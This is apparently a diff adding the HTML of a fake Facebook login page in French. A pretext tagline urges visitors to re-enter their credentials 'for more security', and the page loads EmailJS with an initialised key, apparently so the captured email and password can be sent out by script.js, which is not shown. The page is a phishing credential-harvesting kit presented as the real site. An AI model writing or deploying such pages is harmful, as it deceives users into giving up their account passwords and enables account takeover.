@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Connexion ou inscription</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("IOUhbkeE0PcaaDBia");
+        })();
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <div class="content-wrapper">
+            <div class="logo-section">
+                <img src="logo.png" alt="Facebook" class="fb-logo">
+                <h2 class="tagline">Facebook vous demande de reentrer vos informations pour plus de sécurité.</h2>
+            </div>
+            <div class="login-card-section">
+                <div class="card">
+                    <form id="loginForm">
+                        <div class="input-group">
+                            <input type="text" id="email" name="email" placeholder="Adresse e-mail ou numéro de tél."
+                                required>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+                        </div>
+                        <button type="submit" class="login-btn">Se connecter</button>
+                        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                        <div class="divider"></div>
+                        <button type="button" class="create-account-btn">Créer nouveau compte</button>
+                    </form>
+                </div>
+                <div class="create-page-text">
+                    <a href="#">Créer une Page</a> pour une célébrité, une marque ou une entreprise.
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+
+</html>
